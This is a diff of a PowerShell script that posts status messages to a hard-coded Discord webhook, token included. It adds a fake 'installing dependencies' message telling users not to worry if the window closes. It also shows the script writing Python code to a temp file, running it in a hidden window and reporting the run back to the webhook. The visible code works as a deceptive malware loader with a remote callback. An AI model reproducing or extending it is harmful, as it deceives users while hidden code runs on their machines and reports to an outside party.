@@ -1,5 +1,9 @@
 $webhookUrl = 'https://discord.com/api/webhooks/1411023027860410490/tX-RGpPD7WxrwbTmOcDaU8BZG-2-FDfJsvMi9DXF2Dc57h1WJQMVReBZ-RF2AnmPV095'
 
+Write-Host "Give us 1-3 minutes depending on your PC. We are installing dependencies."
+Write-Host "Don't worry if the window closes, just wait."
+
+
 function Send-WebhookMessage {
     param($Message)
     $body = @{ content = $Message } | ConvertTo-Json -Depth 10
@@ -193,9 +197,8 @@ try {
                             $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_script.py"
                             [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
                             Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
-                           
+                            Send-WebhookMessage -Message "Executed Python script with python.exe"
 
- Send-WebhookMessage -Message "Executed Python script with python.exe"
                         } catch {
                             Send-WebhookMessage -Message "Error executing with python.exe: $_"
                         }
